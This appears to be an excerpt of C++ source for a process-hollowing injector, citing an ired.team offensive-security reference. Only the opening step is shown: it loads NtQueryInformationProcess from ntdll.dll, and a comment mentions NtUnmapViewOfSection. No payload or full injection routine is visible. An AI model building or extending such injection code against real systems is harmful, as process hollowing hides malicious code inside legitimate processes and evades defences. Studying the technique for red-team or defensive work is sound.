...
// ref: https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations
...
int main()
{
	// Dynamically load NtQueryInformationProcess and NtUnmapViewOfSection
	NtQueryInformationProcessPtr NtQueryInformationProcess =
		(NtQueryInformationProcessPtr)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
	if (!NtQueryInformationProcess) {
		std::cerr << "Failed to load NtQueryInformationProcess" << std::endl;
		return -1;
	}
